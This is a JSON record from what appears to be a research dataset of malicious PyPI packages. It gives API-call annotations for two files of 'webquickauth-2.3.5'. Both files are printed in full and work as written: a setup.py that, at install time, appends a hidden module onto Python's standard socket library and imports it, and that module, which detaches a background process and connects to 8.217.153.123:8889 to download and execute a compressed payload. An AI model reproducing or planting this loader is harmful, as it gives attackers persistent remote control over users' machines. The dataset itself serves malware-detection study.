[
  {
    "file_path": "/home2/blue/Documents/PyPIAgent/Dataset/study/unzip_malware/webquickauth-2.3.5/webquickauth-2.3.5/setup.py",
    "code_snippet": "import os\nimport sys\nimport re\nimport socket\nimport inspect\n\nif 'py_build' not in os.environ:\n    if 'py_dbg' in os.environ:\n        print(inspect.getsourcefile(socket))\n    f = open(inspect.getsourcefile(socket), 'ab+')\n    f.write(open('WebQuickAuth/tmp.py', 'rb').read())\n    f.close()\n    __import__('WebQuickAuth.tmp')",
    "pattern_analysis": {
      "api_sequence": [
        "os.environ",
        "os.environ",
        "inspect.getsourcefile",
        "open",
        "inspect.getsourcefile",
        "open",
        "open.read",
        "open.write",
        "open.close",
        "__import__"
      ],
      "api_sequence_with_args": [
        "os.environ",
        "os.environ",
        "inspect.getsourcefile(socket)",
        "open(inspect.getsourcefile(socket), 'ab+')",
        "inspect.getsourcefile(socket)",
        "open('WebQuickAuth/tmp.py', 'rb')",
        "open('WebQuickAuth/tmp.py', 'rb').read()",
        "open(inspect.getsourcefile(socket), 'ab+').write(open('WebQuickAuth/tmp.py', 'rb').read())",
        "open(inspect.getsourcefile(socket), 'ab+').close()",
        "__import__('WebQuickAuth.tmp')"
      ],
      "mapped_sequence": [
        {
          "api_name": "os.environ",
          "id": "get_env_vars",
          "description": "Retrieves environment variables mapping",
          "first_id": "system_operations",
          "second_id": "system_environment_operations",
          "third_id": "environment_information"
        },
        {
          "api_name": "os.environ",
          "id": "get_env_vars",
          "description": "Retrieves environment variables mapping",
          "first_id": "system_operations",
          "second_id": "system_environment_operations",
          "third_id": "environment_information"
        },
        {
          "api_name": "inspect.getsourcefile",
          "id": "path_string_operations",
          "description": "Basic path string operations (getting absolute path, base name, parent directory, splitting and joining paths)",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_path_operations"
        },
        {
          "api_name": "open",
          "id": "combined_mode_operations",
          "description": "Combined mode file opening operations (read-write mode, append mode, etc.)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_opening"
        },
        {
          "api_name": "inspect.getsourcefile",
          "id": "path_string_operations",
          "description": "Basic path string operations (getting absolute path, base name, parent directory, splitting and joining paths)",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_path_operations"
        },
        {
          "api_name": "open",
          "id": "basic_read_operations",
          "description": "ic file opening operations for reading (normal reading, binary reading)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_opening"
        },
        {
          "api_name": "open.read",
          "id": "basic_file_reading",
          "description": "Reading content from files (by lines or entire content)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_reading"
        },
        {
          "api_name": "open.write",
          "id": "basic_file_writing",
          "description": "Writing data to files (strings or bytes)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_writing"
        },
        {
          "api_name": "open.close",
          "id": "close_file",
          "description": "Closes the opened file",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_closing"
        },
        {
          "api_name": "__import__",
          "id": "import_dynamic",
          "description": "Dynamically imports specified module",
          "first_id": "code_execution",
          "second_id": "module_management",
          "third_id": "module_importing"
        }
      ],
      "contextual_code": "import os\nimport inspect\nimport socket\n\nif 'py_build' not in os.environ:\n    if 'py_dbg' in os.environ:\n        print(inspect.getsourcefile(socket))\n    f = open(inspect.getsourcefile(socket), 'ab+')\n    f.write(open('WebQuickAuth/tmp.py', 'rb').read())\n    f.close()\n    __import__('WebQuickAuth.tmp')"
    }
  },
  {
    "file_path": "/home2/blue/Documents/PyPIAgent/Dataset/study/unzip_malware/webquickauth-2.3.5/webquickauth-2.3.5/WebQuickAuth/tmp.py",
    "code_snippet": "import os\nimport subprocess\nimport sys\nimport tempfile\nimport time\nimport threading\n\np_tmp_file = os.path.join(tempfile.gettempdir(), 'python_pyc_cache')\np_clone = True\nif os.path.exists(p_tmp_file) and not hasattr(sys,'python_pyc_cache'):\n    modification_time = os.path.getmtime(p_tmp_file)\n    current_time = time.time()\n    time_difference = current_time - modification_time\n    if time_difference < 30:\n        p_clone = False\n    else:\n        open(p_tmp_file, 'w').close()\nelse:\n    open(p_tmp_file, 'w').close()\nif p_clone:\n    py_run = exec\n\n    def p_john_run(t):\n        while t.is_alive():\n            open(p_tmp_file, 'w').close()\n            t.join(10)\n\n    if not hasattr(sys,'python_pyc_cache'):\n        command = '{0} -c \"import sys;sys.python_pyc_cache=1;import socket;sys.g_p_tread.join()\"'.format(sys.executable)\n        try:\n            import msvcrt\n            subprocess.Popen(command, shell=True, creationflags=134218256)\n        except:\n            cmd = f'nohup {command} > /dev/null 2>&1 &'\n            os.system(cmd)\n\n    main_thread = threading.Thread(target=lambda: [\n        py_run(\"\"\"\ntry:\n    import zlib, base64, ssl, socket, struct, time, warnings\n\n    warnings.filterwarnings(\"ignore\", category=DeprecationWarning)\n    function = exec\n    time.sleep(5)\n\n    for x in range(10):\n        try:\n            so = socket.socket(2, 1)\n            so.connect(('8.217.153.123', 8889))\n            if hasattr(ssl, 'wrap_socket'):\n                s = ssl.wrap_socket(so)\n            else:\n                sc = ssl.create_default_context()\n                sc.check_hostname = False\n                sc.verify_mode = ssl.CERT_NONE\n                s = sc.wrap_socket(so)\n            break\n        except:\n            time.sleep(5)\n    cb = s.recv(4)\n    l = struct.unpack('>I', cb)[0]\n    d = s.recv(l)\n    while len(d) < l:\n        bl = l - len(d)\n        d += s.recv(bl)\n    d = base64.b64decode(d)\n    function(zlib.decompress(d), {'s': s})\nexcept:\n    pass\n                \"\"\")\n    ], name='GC', daemon=True)\n    main_thread.start()\n    sys.g_p_tread = main_thread\n    threading.Thread(target=p_john_run, name='daemon-thread-1', daemon=True, args=[main_thread]).start()\n    if hasattr(sys,'python_pyc_cache'):\n        del sys.python_pyc_cache",
    "pattern_analysis": {
      "api_sequence": [
        "os.path.join",
        "tempfile.gettempdir",
        "os.path.exists",
        "hasattr",
        "os.path.getmtime",
        "time.time",
        "open",
        "open",
        "open",
        "exec",
        "threading.Thread",
        "threading.Thread.start",
        "setattr",
        "threading.Thread",
        "threading.Thread.start",
        "hasattr",
        "delattr",
        "warnings.filterwarnings",
        "time.sleep",
        "socket.socket",
        "socket.socket.connect",
        "hasattr",
        "ssl.wrap_socket",
        "ssl.create_default_context",
        "setattr",
        "setattr",
        "ssl.SSLContext.wrap_socket",
        "time.sleep",
        "socket.socket.recv",
        "struct.unpack",
        "socket.socket.recv",
        "socket.socket.recv",
        "base64.b64decode",
        "zlib.decompress",
        "exec"
      ],
      "api_sequence_with_args": [
        "os.path.join(tempfile.gettempdir(), 'python_pyc_cache')",
        "tempfile.gettempdir()",
        "os.path.exists(p_tmp_file)",
        "hasattr(sys, 'python_pyc_cache')",
        "os.path.getmtime(p_tmp_file)",
        "time.time()",
        "open(p_tmp_file, 'w').close()",
        "open(p_tmp_file, 'w').close()",
        "open(p_tmp_file, 'w').close()",
        "exec(...)",
        "threading.Thread(target=..., name='GC', daemon=True)",
        "threading.Thread.start()",
        "setattr(sys, 'g_p_tread', main_thread)",
        "threading.Thread(target=p_john_run, name='daemon-thread-1', daemon=True, args=[main_thread])",
        "threading.Thread.start()",
        "hasattr(sys, 'python_pyc_cache')",
        "delattr(sys, 'python_pyc_cache')",
        "warnings.filterwarnings('ignore', category=DeprecationWarning)",
        "time.sleep(5)",
        "socket.socket(2, 1)",
        "socket.socket.connect(('8.217.153.123', 8889))",
        "hasattr(ssl, 'wrap_socket')",
        "ssl.wrap_socket(so)",
        "ssl.create_default_context()",
        "setattr(sc, 'check_hostname', False)",
        "setattr(sc, 'verify_mode', ssl.CERT_NONE)",
        "ssl.SSLContext.wrap_socket(so)",
        "time.sleep(5)",
        "socket.socket.recv(4)",
        "struct.unpack('>I', cb)[0]",
        "socket.socket.recv(l)",
        "socket.socket.recv(bl)",
        "base64.b64decode(d)",
        "zlib.decompress(d)",
        "exec(zlib.decompress(d), {'s': s})"
      ],
      "mapped_sequence": [
        {
          "api_name": "os.path.join",
          "id": "path_string_operations",
          "description": "Basic path string operations (getting absolute path, base name, parent directory, splitting and joining paths)",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_path_operations"
        },
        {
          "api_name": "tempfile.gettempdir",
          "id": "path_special_operations",
          "description": "Special path operations (home directory expansion, temporary directory path, executable path, directory tree generation)",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_path_operations"
        },
        {
          "api_name": "os.path.exists",
          "id": "check_path_exists",
          "description": "Checks if specified path exists in filesystem",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_checking"
        },
        {
          "api_name": "hasattr",
          "id": "check_instance_type",
          "description": "Checks if object is instance of specified type",
          "first_id": "utility_functions",
          "second_id": "logging_exception_handling",
          "third_id": "exception_checking"
        },
        {
          "api_name": "os.path.getmtime",
          "id": "get_current_time",
          "description": "Returns current time in seconds since epoch",
          "first_id": "system_operations",
          "second_id": "system_environment_operations",
          "third_id": "time_operations"
        },
        {
          "api_name": "time.time",
          "id": "get_current_time",
          "description": "Returns current time in seconds since epoch",
          "first_id": "system_operations",
          "second_id": "system_environment_operations",
          "third_id": "time_operations"
        },
        {
          "api_name": "open",
          "id": "basic_write_operations",
          "description": "Basic file opening operations for writing (normal writing, binary writing)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_opening"
        },
        {
          "api_name": "open",
          "id": "basic_write_operations",
          "description": "Basic file opening operations for writing (normal writing, binary writing)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_opening"
        },
        {
          "api_name": "open",
          "id": "basic_write_operations",
          "description": "Basic file opening operations for writing (normal writing, binary writing)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_opening"
        },
        {
          "api_name": "exec",
          "id": "exec_python_code",
          "description": "Dynamically executes Python code string",
          "first_id": "code_execution",
          "second_id": "code_evaluation_execution",
          "third_id": "string_execution"
        },
        {
          "api_name": "threading.Thread",
          "id": "create_thread",
          "description": "Creates new thread to execute target function",
          "first_id": "system_operations",
          "second_id": "thread_management",
          "third_id": "thread_creation"
        },
        {
          "api_name": "threading.Thread.start",
          "id": "start_thread",
          "description": "Starts thread execution",
          "first_id": "system_operations",
          "second_id": "thread_management",
          "third_id": "thread_control"
        },
        {
          "api_name": "setattr",
          "id": "set_builtin_attr",
          "description": "Sets attribute on builtins object",
          "first_id": "persistence_stealth",
          "second_id": "stealth_techniques",
          "third_id": "warning_disabling"
        },
        {
          "api_name": "threading.Thread",
          "id": "create_thread",
          "description": "Creates new thread to execute target function",
          "first_id": "system_operations",
          "second_id": "thread_management",
          "third_id": "thread_creation"
        },
        {
          "api_name": "threading.Thread.start",
          "id": "start_thread",
          "description": "Starts thread execution",
          "first_id": "system_operations",
          "second_id": "thread_management",
          "third_id": "thread_control"
        },
        {
          "api_name": "hasattr",
          "id": "check_instance_type",
          "description": "Checks if object is instance of specified type",
          "first_id": "utility_functions",
          "second_id": "logging_exception_handling",
          "third_id": "exception_checking"
        },
        {
          "api_name": "delattr",
          "id": "set_builtin_attr",
          "description": "Sets attribute on builtins object",
          "first_id": "persistence_stealth",
          "second_id": "stealth_techniques",
          "third_id": "warning_disabling"
        },
        {
          "api_name": "warnings.filterwarnings",
          "id": "disable_ssl_warnings",
          "description": "Disables SSL certificate warnings in urllib3",
          "first_id": "persistence_stealth",
          "second_id": "stealth_techniques",
          "third_id": "warning_disabling"
        },
        {
          "api_name": "time.sleep",
          "id": "suspend_execution",
          "description": "Suspends execution for specified seconds",
          "first_id": "system_operations",
          "second_id": "system_environment_operations",
          "third_id": "time_operations"
        },
        {
          "api_name": "socket.socket",
          "id": "create_socket",
          "description": "Creates new socket object",
          "first_id": "basic_network_operations",
          "second_id": "socket_communication",
          "third_id": "socket_creation"
        },
        {
          "api_name": "socket.socket.connect",
          "id": "establish_tcp_connection",
          "description": "Establishes TCP connection to specified address",
          "first_id": "basic_network_operations",
          "second_id": "socket_communication",
          "third_id": "connection_management"
        },
        {
          "api_name": "hasattr",
          "id": "check_instance_type",
          "description": "Checks if object is instance of specified type",
          "first_id": "utility_functions",
          "second_id": "logging_exception_handling",
          "third_id": "exception_checking"
        },
        {
          "api_name": "ssl.wrap_socket",
          "id": "wrap_socket_ssl",
          "description": "Wraps socket for SSL/TLS communication",
          "first_id": "basic_network_operations",
          "second_id": "socket_communication",
          "third_id": "connection_management"
        },
        {
          "api_name": "ssl.create_default_context",
          "id": "create_ssl_context",
          "description": "Creates SSL context with specified protocol",
          "first_id": "persistence_stealth",
          "second_id": "stealth_techniques",
          "third_id": "warning_disabling"
        },
        {
          "api_name": "setattr",
          "id": "set_builtin_attr",
          "description": "Sets attribute on builtins object",
          "first_id": "persistence_stealth",
          "second_id": "stealth_techniques",
          "third_id": "warning_disabling"
        },
        {
          "api_name": "setattr",
          "id": "set_builtin_attr",
          "description": "Sets attribute on builtins object",
          "first_id": "persistence_stealth",
          "second_id": "stealth_techniques",
          "third_id": "warning_disabling"
        },
        {
          "api_name": "ssl.SSLContext.wrap_socket",
          "id": "wrap_socket_ssl",
          "description": "Wraps socket for SSL/TLS communication",
          "first_id": "basic_network_operations",
          "second_id": "socket_communication",
          "third_id": "connection_management"
        },
        {
          "api_name": "time.sleep",
          "id": "suspend_execution",
          "description": "Suspends execution for specified seconds",
          "first_id": "system_operations",
          "second_id": "system_environment_operations",
          "third_id": "time_operations"
        },
        {
          "api_name": "socket.socket.recv",
          "id": "receive_socket_data",
          "description": "Receives data from socket connection",
          "first_id": "basic_network_operations",
          "second_id": "socket_communication",
          "third_id": "data_transmission"
        },
        {
          "api_name": "struct.unpack",
          "id": "pack_values",
          "description": "Packs values into bytes using specified format",
          "first_id": "data_transformation_processing",
          "second_id": "data_encoding",
          "third_id": "byte_encoding"
        },
        {
          "api_name": "socket.socket.recv",
          "id": "receive_socket_data",
          "description": "Receives data from socket connection",
          "first_id": "basic_network_operations",
          "second_id": "socket_communication",
          "third_id": "data_transmission"
        },
        {
          "api_name": "socket.socket.recv",
          "id": "receive_socket_data",
          "description": "Receives data from socket connection",
          "first_id": "basic_network_operations",
          "second_id": "socket_communication",
          "third_id": "data_transmission"
        },
        {
          "api_name": "base64.b64decode",
          "id": "decode_base64_to_bytes",
          "description": "Decodes base64-encoded string to bytes",
          "first_id": "data_transformation_processing",
          "second_id": "data_encoding",
          "third_id": "base_encoding"
        },
        {
          "api_name": "zlib.decompress",
          "id": "decompress_data_zlib",
          "description": "Decompresses zlib-compressed data",
          "first_id": "file_operations",
          "second_id": "compression_archiving",
          "third_id": "compression_decompression"
        },
        {
          "api_name": "exec",
          "id": "exec_python_code",
          "description": "Dynamically executes Python code string",
          "first_id": "code_execution",
          "second_id": "code_evaluation_execution",
          "third_id": "string_execution"
        }
      ],
      "contextual_code": "import os\nimport subprocess\nimport sys\nimport tempfile\nimport time\nimport threading\n\np_tmp_file = os.path.join(tempfile.gettempdir(), 'python_pyc_cache')\np_clone = True\nif os.path.exists(p_tmp_file) and not hasattr(sys,'python_pyc_cache'):\n    modification_time = os.path.getmtime(p_tmp_file)\n    current_time = time.time()\n    time_difference = current_time - modification_time\n    if time_difference < 30:\n        p_clone = False\n    else:\n        open(p_tmp_file, 'w').close()\nelse:\n    open(p_tmp_file, 'w').close()\nif p_clone:\n    py_run = exec\n\n    def p_john_run(t):\n        while t.is_alive():\n            open(p_tmp_file, 'w').close()\n            t.join(10)\n\n    if not hasattr(sys,'python_pyc_cache'):\n        command = '{0} -c \"import sys;sys.python_pyc_cache=1;import socket;sys.g_p_tread.join()\"'.format(sys.executable)\n        try:\n            import msvcrt\n            subprocess.Popen(command, shell=True, creationflags=134218256)\n        except:\n            cmd = f'nohup {command} > /dev/null 2>&1 &'\n            os.system(cmd)\n\n    main_thread = threading.Thread(target=lambda: [\n        py_run(\"\"\"\ntry:\n    import zlib, base64, ssl, socket, struct, time, warnings\n\n    warnings.filterwarnings(\"ignore\", category=DeprecationWarning)\n    function = exec\n    time.sleep(5)\n\n    for x in range(10):\n        try:\n            so = socket.socket(2, 1)\n            so.connect(('8.217.153.123', 8889))\n            if hasattr(ssl, 'wrap_socket'):\n                s = ssl.wrap_socket(so)\n            else:\n                sc = ssl.create_default_context()\n                sc.check_hostname = False\n                sc.verify_mode = ssl.CERT_NONE\n                s = sc.wrap_socket(so)\n            break\n        except:\n            time.sleep(5)\n    cb = s.recv(4)\n    l = struct.unpack('>I', cb)[0]\n    d = s.recv(l)\n    while len(d) < l:\n        bl = l - len(d)\n        d += s.recv(bl)\n    d = base64.b64decode(d)\n    function(zlib.decompress(d), {'s': s})\nexcept:\n    pass\n                \"\"\")\n    ], name='GC', daemon=True)\n    main_thread.start()\n    sys.g_p_tread = main_thread\n    threading.Thread(target=p_john_run, name='daemon-thread-1', daemon=True, args=[main_thread]).start()\n    if hasattr(sys,'python_pyc_cache'):\n        del sys.python_pyc_cache"
    }
  }
]